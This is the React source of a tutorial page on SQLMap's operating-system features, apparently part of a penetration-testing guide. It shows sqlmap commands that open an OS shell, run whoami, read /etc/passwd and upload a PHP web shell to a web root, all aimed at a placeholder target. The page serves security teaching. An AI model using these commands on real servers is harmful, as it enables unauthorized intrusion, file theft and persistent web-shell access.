'use client'
import DocHeading from '@/components/base/DocHeading';
import CodeBlock from '@/components/base/Codeblock';
import InlineCode from '@/components/base/InlineCode';
import Callout from '@/components/base/Callout';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

export default function OSCommandsPage() {
  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-medium font-mono mb-4">
          <i className="ri-terminal-box-line" />
          SQLMap Section 6 of 13
        </div>
        <DocHeading level={1}>OS Commands</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Execute operating system commands and read/write files on vulnerable servers. Requires stacked queries or certain database privileges.
        </p>
      </motion.div>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <Callout type="danger">
          OS command execution can cause serious damage. Only use in authorized penetration testing environments.
        </Callout>
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Get OS Shell</h3>
        <p className="text-cyber-text text-sm mb-3">
          Interactive shell (requires stacked queries):
        </p>
        <CodeBlock code="sqlmap -u 'http://target.com?id=1' --os-shell" />
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Execute Single Command</h3>
        <p className="text-cyber-text text-sm mb-3">
          Run a specific command:
        </p>
        <CodeBlock code="sqlmap -u 'http://target.com?id=1' --os-cmd=whoami" />
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Read Server Files</h3>
        <p className="text-cyber-text text-sm mb-3">
          Download files from the target server:
        </p>
        <CodeBlock code="sqlmap -u 'http://target.com?id=1' --file-read=/etc/passwd" />
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Write Files to Server</h3>
        <p className="text-cyber-text text-sm mb-3">
          Upload a file (path must be writable):
        </p>
        <CodeBlock code="sqlmap -u 'http://target.com?id=1' --file-write=localfile.php --file-dest=/var/www/html/shell.php" />
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Requirements</h3>
        <ul className="space-y-2 text-sm text-cyber-text">
          <li className="flex items-start gap-2">
            <span className="w-1.5 h-1.5 rounded-full bg-cyber-red flex-shrink-0 mt-1.5" />
            <span>Stacked queries must be supported (MySQL, MSSQL, PostgreSQL)</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="w-1.5 h-1.5 rounded-full bg-cyber-red flex-shrink-0 mt-1.5" />
            <span>Web application must have file system write permissions</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="w-1.5 h-1.5 rounded-full bg-cyber-red flex-shrink-0 mt-1.5" />
            <span>Database user needs OS-level privileges</span>
          </li>
        </ul>
      </motion.section>

      <motion.section className="mt-10 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="flex gap-3">
          <a href="/sqlmap/flags" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            Next: Common Flags <i className="ri-arrow-right-line ml-1" />
          </a>
          <a href="/sqlmap/data-extraction" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-red hover:text-cyber-red transition-all whitespace-nowrap">
            <i className="ri-arrow-left-line mr-1" /> Back
          </a>
        </div>
      </motion.section>
    </div>
  );
}